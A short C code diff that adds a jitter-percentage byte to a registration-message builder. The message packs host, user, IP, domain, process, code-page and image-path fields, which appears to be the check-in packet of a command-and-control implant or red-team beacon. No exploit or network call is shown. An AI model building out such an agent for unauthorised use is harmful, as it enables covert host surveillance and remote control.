@@ -86,6 +86,7 @@ int nax_frame_decode(const uint8_t *frame, uint32_t frame_len,
  *   u32 acp
  *   u32 oem_cp
  *   u16 img_len + img
+ *   u8  jitter_pct   <-- appended at end for backward compat
  */
 int nax_build_reg_body(const char *hn,   uint32_t hn_len,
                        const char *un,   uint32_t un_len,
@@ -104,11 +105,12 @@ int nax_build_reg_body(const char *hn,   uint32_t hn_len,
                        uint32_t    acp,
                        uint32_t    oem_cp,
                        const char *img,  uint32_t img_len,
+                       uint8_t     jitter_pct,
                        uint8_t    *out,  uint32_t *out_len)
 {
     uint32_t needed = 2 + hn_len + 2 + un_len + 1 + 4 + 4 + 4 +
                       2 + ip_len + 2 + dom_len + 2 + proc_len +
-                      1 + 4 + 4 + 2 + 4 + 4 + 4 + 2 + img_len;
+                      1 + 4 + 4 + 2 + 4 + 4 + 4 + 2 + img_len + 1;
     if (*out_len < needed) return -1;
 
     uint8_t *p = out;
@@ -133,6 +135,7 @@ int nax_build_reg_body(const char *hn,   uint32_t hn_len,
     w16(p, (uint16_t)img_len);  p += 2;
     if (img_len > 0) memcpy(p, img, img_len);
     p += img_len;
+    *p++ = jitter_pct;
 
     *out_len = needed;
     return 0;
